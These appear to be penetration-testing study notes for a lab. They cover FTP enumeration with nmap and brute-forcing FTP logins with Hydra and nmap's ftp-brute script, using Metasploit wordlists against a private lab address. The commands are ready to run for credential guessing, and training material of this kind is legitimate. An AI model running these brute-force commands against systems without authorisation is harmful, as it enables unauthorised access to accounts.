## FTP — File Transfer Protocol

Used for storing files on a server and accessing them remotely. Runs on **TCP port 21**.

---

## Enumeration

```bash
# Default scan
nmap 192.168.177.129

# Targeted FTP scan with version and OS detection
nmap -p21 192.168.177.129 -sV -O
```

---

## FTP Client Connection

```bash
ftp 192.168.177.129
```

## Hydra Brute Force

| Flag | Meaning |
|------|---------|
| `-l` | Single username (lowercase) |
| `-L` | Username list file (uppercase) |
| `-p` | Single password (lowercase) |
| `-P` | Password list file (uppercase) |

```bash
# Username list + password list
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.177.129 ftp

# Known username + password list
hydra -l msfadmin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.177.129 ftp
```

## Nmap FTP Brute Forcer

### Create Username List

```bash
echo "msfadmin" > users
cat users
```

```output
msfadmin
```

### Run FTP Brute Script

```bash
# Absolute path
nmap 192.168.177.129 --script ftp-brute --script-args userdb=/root/users -p21

# Relative path
nmap 192.168.177.129 --script ftp-brute --script-args userdb=./users -p21
```

| Component | Meaning |
|-----------|---------|
| `--script ftp-brute` | NSE script for FTP password cracking |
| `--script-args userdb=` | Passes argument to script (username list location) |
| `>` | Redirect output to file |
| `echo ""` | Print string to terminal |

---

## Flag Reference

| Flag/Symbol     | Purpose                                            |
| --------------- | -------------------------------------------------- |
| `>`             | Redirect output to file                            |
| `echo`          | Print text to terminal                             |
| `--script-args` | Pass arguments to NSE scripts                      |
| `userdb=`       | Specify username list path for brute force scripts |
